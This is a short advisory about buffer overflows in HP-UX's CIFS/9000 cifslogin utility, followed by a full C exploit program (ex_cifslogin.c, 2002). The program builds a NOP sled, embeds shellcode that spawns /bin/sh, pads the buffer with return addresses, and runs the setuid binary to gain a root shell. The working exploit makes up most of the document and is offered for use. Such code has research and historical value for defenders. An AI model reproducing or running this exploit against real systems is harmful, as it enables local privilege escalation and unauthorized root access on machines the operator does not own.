// source: https://www.securityfocus.com/bid/5088/info

A vulnerability has been reported in the /opt/cifsclient/bin/cifslogin utility distributed with CIFS/9000. The utility is prone to several buffer overflow conditions and may lead to root compromise.

The vulnerability occurs due to the lack of bounds checking when accepting user input for various commandline options. Specifically, the utility fails to check for excessively long arguments to the following commandline options: '-U', '-D', '-P', '-S', '-N', and '-u'.

/*
Name    : ex_cifslogin.c
Compile : cc ex_cifslogin -o cifslogin
Purpose : exploit cifslogin command for HP-UX 11.11 11.0 10.20��to get root shell
Author  : watercloud < safesuite@263.net, watercloud@xfocus.net >
Date    : 2002-11-6
Announce: Use as your own risk��
Thanks  : bear < bearundertree@163.com >
Tested  : HPUX B11.11
*/
#include<stdio.h>

#define T_LEN  2304
#define BUFF_LEN 2176
#define NOP 0x0b390280

char shellcode[]=
        "\xe8\x3f\x1f\xfd\xb4\x23\x03\xe8\x60\x60\x3c\x61\x0b\x39\x02"
        "\x99\x34\x1a\x3c\x53\x0b\x43\x06\x1a\x20\x20\x08\x01\x34\x16\x03"
        "\xe8\xe4\x20\xe0\x08\x96\xd6\x03\xfe/bin/shA";
long addr;
char buffer[T_LEN];

main()
{
        int addr_off =800 ;

        int  n=BUFF_LEN/4,i=0;
        long * ap = (long *) &buffer[BUFF_LEN];
        char * sp = &buffer[BUFF_LEN-strlen(shellcode)];
        long * np = (long *) buffer;

        addr = ((long) &addr_off + T_LEN ) & 0xffffff40 +0x40 ;

        for(i=0;i<n;np[i++]=NOP);
        memcpy(sp,shellcode,strlen(shellcode));
        for(i=0;i<(T_LEN-BUFF_LEN)/4;ap[i++]=addr+addr_off);

        printf("SP=0x%x EXP_SP=0x%x OFF=0x%x (%i)\n",(long)&addr_off & 0xffffff40,addr,addr_off);
        printf("Addr =0x%x NOP_LEN=%i\n",addr+addr_off,BUFF_LEN-strlen(shellcode));
        printf("BUFFER_LEN=%i\n",strlen(buffer));

        execl("/opt/cifsclient/bin/cifslogin","cifslogin","123",buffer,NULL);
}